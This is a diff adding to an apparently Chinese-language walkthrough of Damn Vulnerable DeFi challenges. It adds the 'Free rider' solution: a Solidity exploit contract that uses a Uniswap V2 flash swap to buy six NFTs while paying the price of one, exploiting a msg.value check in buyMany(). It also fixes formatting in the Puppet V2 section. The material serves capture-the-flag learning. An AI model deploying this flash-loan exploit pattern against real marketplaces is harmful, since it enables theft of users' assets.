@@ -556,7 +556,7 @@ forge test --match-contract PuppetPool -vvvv
 
 解决方案:
 
-看看 `PuppetV2Pool.sol` 合约, 看到 **calculateDepositOfWETHRequired()** 这次需要存入借出的 DVT 代币的 3倍金额的 WETH,再看看_getOracleQuote() 对 DVT 价格的获取,先通过 **UniswapV2Library.getReserves()** 获取两个代币的储备量,再使用**UniswapV2Library.quote()**  进行计算,然而计算方式和之前 v1 并没有多大区别,还是能轻松 swap 改变池子储备量,对价格进行操纵,步骤和上一题差不多,只需要改成 v2 的交换函数,和把 ETH 包装成 WETH.
+看看 `PuppetV2Pool.sol` 合约, 看到 **calculateDepositOfWETHRequired()** 这次需要存入借出的 DVT 代币的 3倍金额的 WETH,再看看**_getOracleQuote()  ** 对 DVT 价格的获取,先通过 **UniswapV2Library.getReserves()** 获取两个代币的储备量,再使用**UniswapV2Library.quote()**  进行计算,然而计算方式和之前 v1 并没有多大区别,还是能轻松 swap 改变池子储备量,对价格进行操纵,步骤和上一题差不多,只需要改成 v2 的交换函数,和把 ETH 包装成 WETH.
 
 使用 foundry 编写测试:
 
@@ -586,5 +586,98 @@ forge test --match-contract PuppetV2 -vvvv
 
 
 
+# #10 - Free rider
 
+合约:
+
+- [FreeRiderNFTMarketplace.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/free-rider/FreeRiderNFTMarketplace.sol) NFT 交易市场
+- [FreeRiderBuyer.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/free-rider/FreeRiderBuyer.sol)  收购 NFT 合约
+
+题目要求:
+
+有 6 个 NFT 在 NFT 交易市场出售,每个 15 ETH.一位买家与您分享了一个 alpha: NFT 交易市场有漏洞,所有的  NFT 都可以被拿走,然而买家不知道怎么利用.因此于买家达成一个协议：为愿意取出 NFT 交易市6个 NFT 并将其发送到 收购 NFT 合约人发送 45 ETH.你的初始余额只有0.5 ETH
+
+解决方案:
+
+`FreeRiderNFTMarketplace` NFT 交易市场存在的漏洞就是 **buyMany()** 函数传入要购买的多个 NFT Tokenid 数组 for 循环调用 **_buyOne()** 函数 **msg.value** 错误的判断,**buyMany()** 购买多个 NFT 只需要发送一个 NFT 价格 15 ETH 就能通过 require 检查,而我们初始余额只有 0.5 ETH,就需要从 Uniswap 的池子里 **flashswap()** 借用 15 WETH,换成 ETH,花费 15 ETH 调用 **buyMany()**就能从 NFT 交易市场里获得 6 个 NFT,发送给 **FreeRiderBuyer** 合约,从 **onERC721Received()** hook里获得买家承诺的 45  ETH,把 ETH + flashswap free还给 Uniswap,最终获得 35 ETH左右,完成挑战.
+
+使用 foundry 编写测试:
+
+[FreeRider.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/FreeRider.t.sol) 
+
+```solidity
+contract PayLoad is IERC721Receiver{
+    IUniswapV2Pair uniswapv2pair;
+    WETH9 weth;
+    FreeRiderNFTMarketplace freeridernftmarketplace;
+    FreeRiderBuyer freeriderbuyer;
+    DamnValuableNFT dvnft;
+    uint256 [] TokenIdCollections = [0, 1, 2, 3, 4, 5];
+    constructor(IUniswapV2Pair _uniswapv2pairaddr, WETH9 _wethaddr, FreeRiderNFTMarketplace _freeridernftmarketplaceaddr, FreeRiderBuyer _freeriderbuyeraddr, DamnValuableNFT _dvnftaddr) {
+        uniswapv2pair = _uniswapv2pairaddr;
+        weth = _wethaddr;
+        freeridernftmarketplace = _freeridernftmarketplaceaddr;
+        freeriderbuyer = _freeriderbuyeraddr;
+        dvnft = _dvnftaddr;
+    }
+    function Start() public payable{
+        uint amount0Out = 0;
+        uint amount1Out = 15 ether;
+        bytes memory data = abi.encode(address(weth), 15 ether);
+
+        uniswapv2pair.swap(amount0Out, amount1Out, address(this), data);
+        
+    }
+    function uniswapV2Call(
+    address _sender,
+    uint _amount0,
+    uint _amount1,
+    bytes calldata _data
+  ) external {
+    require(msg.sender == address(uniswapv2pair), "!no pair,no pain");
+    (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
+    uint fee = ((amount * 3) / 997) + 1;
+    uint amountToRepay = amount + fee;
+
+    weth.withdraw(15 ether);
+    freeridernftmarketplace.buyMany{value: 15 ether}(TokenIdCollections);
+    for(uint8 i = 0; i < TokenIdCollections.length; i++) {
+        dvnft.safeTransferFrom(address(this), address(freeriderbuyer), i);
+    }
+    weth.deposit{value: amountToRepay}();
+    weth.transfer(address(uniswapv2pair), amountToRepay);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    )
+        external
+        override
+        returns (bytes4) 
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+    
+    fallback() external payable{}
+}
+
+contract FreeRider is Test {
+//..
+    function testExploit() public {
+        vm.startPrank(attacker, attacker);
+        payload = new PayLoad(uniswapV2Pair, weth, freeRiderNFTMarketplace, freeRiderBuyer, damnValuableNFT);
+        payload.Start();
+        vm.stopPrank();
+        verfiy();
+    }
+//..
+}
+```
+
+```
+forge test --match-contract FreeRider -vvvv
+```
 
